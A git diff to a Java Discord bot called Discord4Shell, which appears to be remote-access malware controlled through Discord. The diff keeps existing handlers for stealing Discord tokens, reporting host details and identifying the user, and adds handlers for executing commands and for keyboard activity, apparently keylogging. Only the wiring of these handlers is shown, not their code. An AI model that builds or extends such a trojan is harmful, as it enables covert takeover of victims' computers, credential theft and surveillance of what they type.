@@ -6,13 +6,12 @@ import net.dv8tion.jda.api.entities.Activity;
 import net.dv8tion.jda.api.requests.GatewayIntent;
 import org.example.commands.*;
 
-import java.io.IOException;
-
 
 public class Discord4Shell {
+    public static JDA bot;
     public static String user = System.getProperty("user.name");
     public static void main(String[] args) {
-        JDA bot = JDABuilder.createDefault("Token")
+        bot = JDABuilder.createDefault("token")
                 .setActivity(Activity.playing("No Larry?"))
                 .enableIntents(GatewayIntent.MESSAGE_CONTENT)
                 .build();
@@ -24,7 +23,9 @@ public class Discord4Shell {
         bot.addEventListener(new GetDiscordTokenMessage());
         bot.addEventListener(new GetHostMessage());
         bot.addEventListener(new WhoAmIMessage());
-
+        bot.addEventListener(new ExecuteCommandMessage());
+        bot.addEventListener(new ReadyMessage());
+        bot.addEventListener(new KeyboardMessage());
 
 
 
